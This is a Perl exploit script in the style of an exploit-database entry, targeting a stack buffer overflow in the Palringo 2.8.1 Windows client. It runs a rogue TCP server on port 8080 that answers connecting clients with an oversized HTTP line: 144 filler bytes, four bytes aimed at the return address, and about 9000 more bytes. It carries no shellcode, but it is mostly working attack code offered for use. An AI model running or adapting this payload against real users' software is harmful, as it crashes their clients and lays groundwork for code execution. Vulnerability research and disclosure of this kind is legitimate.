#!/use/bin/perl
# Exploit Title: ?palringo stack buffer overflow
# Date: 10 January 2015
# Vulnerability discovered by: Mr.ALmfL9
# Vendor Homepage: http://www.palringo.com/
# Software Link: http://www.palringo.com/ar/sa/download/?get=winpc
# Version: 2.8.1
# Tested on: Windows 8.1 
use IO::Socket;
$port  = 8080;
my $payload = "\x41" x 144;
$payload = $payload. "\x42" x 4 ;
$payload = $payload. "\x42" x 9000;
$serv = IO::Socket::INET->new(Proto=>'tcp', LocalPort=>$port, Listen=>1) or die "Error: listen($port)\n";
while($cli=$serv->accept()){
print "[#] port is: $port\n";
print $cli "HTTP/$payload\r\n\r\n";
while(<$cli>){
print $cli;

}
}
#*REFERENCE*
#.1=http://store2.up-00.com/2015-01/1420867197761.png
#.2=http://store2.up-00.com/2015-01/1420867235381.png